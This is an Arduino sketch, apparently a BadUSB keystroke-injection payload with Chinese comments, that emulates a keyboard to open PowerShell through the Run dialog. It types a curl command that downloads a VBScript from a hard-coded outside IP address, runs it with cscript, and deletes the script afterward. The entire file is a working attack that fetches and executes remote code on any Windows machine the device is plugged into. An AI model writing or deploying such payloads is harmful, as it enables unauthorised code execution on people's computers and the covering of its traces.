#include <Keyboard.h>
void setup()
{

  String url = "http://39.106.106.202:12306/SystemInfo.vbs";
  String scriptName = "SystemInfo.vbs";
  String order = "cscript .\\SystemInfo.vbs > sysinfo.txt ; start .\\sysinfo.txt";
  
  Keyboard.begin(); //初始化
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI); //Win键
  delay(100);
  Keyboard.press(' '); //Space键
  delay(100);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(' ');
  delay(100);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('r'); //r键
  delay(100);
  Keyboard.release('r');
  Keyboard.release(KEY_LEFT_GUI);
  delay(300);
  Keyboard.println("powershell");
  delay(500);
  Keyboard.println("curl " + url + " -o " + scriptName);
  delay(500);
  // 运行代码命令
  Keyboard.println(order);
  delay(200);
  Keyboard.println("rm " + scriptName);
  delay(200);
  Keyboard.println("exit");
  delay(100);
  Keyboard.end(); //结束键盘通讯
}
void loop()
{
}
